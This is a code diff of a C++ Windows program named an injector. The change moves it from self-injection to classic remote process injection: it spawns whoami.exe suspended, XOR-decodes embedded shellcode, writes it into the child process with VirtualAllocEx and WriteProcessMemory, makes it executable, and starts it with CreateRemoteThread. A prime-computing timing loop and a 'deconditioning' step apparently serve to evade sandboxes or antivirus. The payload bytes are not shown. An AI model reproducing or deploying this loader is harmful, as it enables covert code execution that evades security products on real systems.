@@ -6,6 +6,13 @@
 #include <sstream>
 #include <thread>
 
+[[noreturn]] void return_err(std::string s, PROCESS_INFORMATION pi) {
+    std::cout << s << "\n";
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    exit(1);
+}
+
 
 int main(int argc, char** argv) {
 
@@ -14,18 +21,26 @@ int main(int argc, char** argv) {
 
     auto start_ae_calc = std::chrono::high_resolution_clock::now();
     volatile bool dummy_ae_calc; // do no optimze "calc prime" loop away
-    for (UINT64 n = 2; n <= 10'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_ae_calc = pr; }
+    for (UINT64 n = 2; n <= 5'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_ae_calc = pr; }
     auto end_ae_calc = std::chrono::high_resolution_clock::now();
     auto ae_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_ae_calc - start_ae_calc).count();
 
     // print current 
     std::cout << "Injector started with PID " << GetCurrentProcessId() << "\n";
 
-    // open own process with read/write
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
+    STARTUPINFO si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+    if (CreateProcess(L"C:\\Windows\\System32\\whoami.exe", nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
+        std::cout << "Created subprocess to inject into\n";
+    }
+    else {
+        return_err("Failed to start proc to inject into", pi);
+    }
+
+    // open process with read/write
+    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pi.dwProcessId);
     if (!hProcess) {
-        std::cout << "Failed to open process: " << GetLastError() << "\n";
-        return 1;
+        return_err("Failed to open process: " + GetLastError(), pi);
     }
 
     std::cout << "Press ENTER to start deconditioning" << std::flush;
@@ -93,41 +108,46 @@ int main(int argc, char** argv) {
     for (size_t i = 0; i < sizeof(shellcode); ++i) { shellcode[i] ^= ((i & 1) == 0 ? 0x45 : 0x46); }
 
     // allocate memory
-    LPVOID new_addr = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (new_addr) {
-		std::cout << "Allocated memory for payload at " << (void*)new_addr << "\n";
+    LPVOID remote_addr = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (remote_addr) {
+		std::cout << "Allocated memory for payload at " << (void*)remote_addr << "\n";
     }
     else {
-		std::cout << "Failed to allocate memory: " << GetLastError() << "\n";
-        return 1;
+        return_err("Failed to allocate memory: " + GetLastError(), pi);
     }
 
     // write value into process' memory
-    memcpy(new_addr, shellcode, sizeof(shellcode));
+    SIZE_T bytes_written;
+    if (WriteProcessMemory(hProcess, remote_addr, &shellcode, sizeof(shellcode), &bytes_written)) {
+        std::cout << "Written payload to " << (void*)remote_addr << "\n";
+    }
+    else {
+        return_err("Failed to write memory" + GetLastError(), pi);
+    }
 
     // change memory protection to executable
     DWORD old_protect;
-    if (VirtualProtect(new_addr, sizeof(shellcode), PAGE_EXECUTE_READ, &old_protect)) {
+    if (VirtualProtectEx(hProcess, remote_addr, sizeof(shellcode), PAGE_EXECUTE_READ, &old_protect)) {
 		std::cout << "Changed memory protection to RX\n";
     }
     else {
-        std::cout << "Failed to change memory protection: " << GetLastError() << "\n";
-        VirtualFree(new_addr, 0, MEM_RELEASE);
-        return 1;
+        VirtualFree(remote_addr, 0, MEM_RELEASE);
+        return_err("Failed to change memory protection: " + GetLastError(), pi);
     }
 
 	std::cout << "Press ENTER to execute payload" << std::flush;
 	std::cin.get();
 
-    HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)new_addr, nullptr, 0, nullptr);
+    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remote_addr, nullptr, 0, nullptr);
     if (hThread) {
         std::cout << "After creating thread\n";
         WaitForSingleObject(hThread, INFINITE); // Optional: wait for it to finish
         CloseHandle(hThread);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
     }
     else {
-        std::cout << "Failed to create remote thread: " << GetLastError() << "\n";
-        return 1;
+        return_err("Failed to create remote thread: " + GetLastError(), pi);
     }
 
     return 0;
